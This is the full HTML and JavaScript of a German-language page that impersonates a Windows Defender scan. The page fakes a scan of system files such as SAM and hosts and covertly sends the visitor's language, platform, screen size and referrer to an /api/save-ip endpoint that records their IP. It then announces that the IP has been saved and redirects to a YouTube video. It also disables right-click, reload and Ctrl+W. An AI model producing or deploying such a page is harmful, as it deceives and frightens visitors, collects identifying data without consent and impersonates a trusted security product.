<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sicherheitsüberprüfung - Windows Defender</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            user-select: none;
            overflow: hidden;
        }

        .scan-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: linear-gradient(0deg, rgba(0,100,255,0.05) 0%, transparent 50%, rgba(0,100,255,0.05) 100%);
            animation: scanLine 3s linear infinite;
            pointer-events: none;
        }

        @keyframes scanLine {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }

        .container {
            background: rgba(0, 20, 40, 0.95);
            border: 1px solid rgba(0, 120, 255, 0.3);
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 0 40px rgba(0, 100, 255, 0.2);
            backdrop-filter: blur(10px);
            max-width: 500px;
            width: 90%;
            z-index: 1;
        }

        .shield-icon { font-size: 60px; margin-bottom: 20px; }

        h2 {
            color: #4da6ff;
            font-size: 24px;
            margin-bottom: 30px;
        }

        .progress-container {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            height: 6px;
            margin: 30px 0;
            border: 1px solid rgba(0,120,255,0.2);
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #0066ff, #4da6ff);
            border-radius: 20px;
            width: 0%;
            transition: width 0.1s;
        }

        .status-text { color: #88bbff; font-size: 14px; margin-top: 15px; }
        .file-scan { color: #4488cc; font-size: 11px; margin-top: 20px; }
        .countdown { color: #ff4444; font-size: 20px; margin-top: 20px; }
    </style>
</head>
<body>
<div class="scan-overlay"></div>

<div class="container">
    <div class="shield-icon">🛡️</div>
    <h2>Windows Sicherheitsüberprüfung</h2>
    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <p class="status-text" id="statusText">Überprüfung läuft... 0%</p>
    <div class="file-scan" id="fileScan"></div>
    <div class="countdown" id="countdown" style="display:none;"></div>
</div>

<script>
    const progressBar = document.getElementById('progressBar');
    const statusText = document.getElementById('statusText');
    const fileScan = document.getElementById('fileScan');
    const countdown = document.getElementById('countdown');

    const fakeFiles = [
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Windows\\System32\\kernel32.dll'
    ];

    let progress = 0;
    let ipSaved = false;

    // IP speichern
    async function saveIP() {
        if (ipSaved) return;
        try {
            const response = await fetch('/api/save-ip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    language: navigator.language,
                    platform: navigator.platform,
                    screenResolution: `${screen.width}x${screen.height}`,
                    referer: document.referrer
                })
            });
            const data = await response.json();
            console.log('✅ IP gespeichert:', data.ip);
            ipSaved = true;
        } catch (e) {
            console.error('Fehler beim Speichern');
        }
    }

    // Scan starten
    saveIP();

    const interval = setInterval(() => {
        if (progress < 100) {
            progress += Math.random() * 5;
            if (progress > 100) progress = 100;
            progressBar.style.width = progress + '%';
            statusText.textContent = `Überprüfung läuft... ${Math.floor(progress)}%`;

            if (Math.random() < 0.4) {
                fileScan.textContent = `🔍 ${fakeFiles[Math.floor(Math.random() * fakeFiles.length)]}`;
            }
        }

        if (progress >= 100) {
            clearInterval(interval);
            progressBar.style.width = '100%';
            statusText.textContent = '⚠️ IP-Adresse gefunden!';
            fileScan.textContent = '❌ Ihre IP wurde gespeichert!';
            countdown.style.display = 'block';
            countdown.textContent = 'Weiterleitung...';

            setTimeout(() => {
                window.location.href = 'https://www.youtube.com/shorts/_6HzLIJPH2A';
            }, 1000);
        }
    }, 100);

    // Schutz
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
        if (e.key === 'F5' || (e.ctrlKey && e.key === 'w')) e.preventDefault();
    });
</script>
</body>
</html>
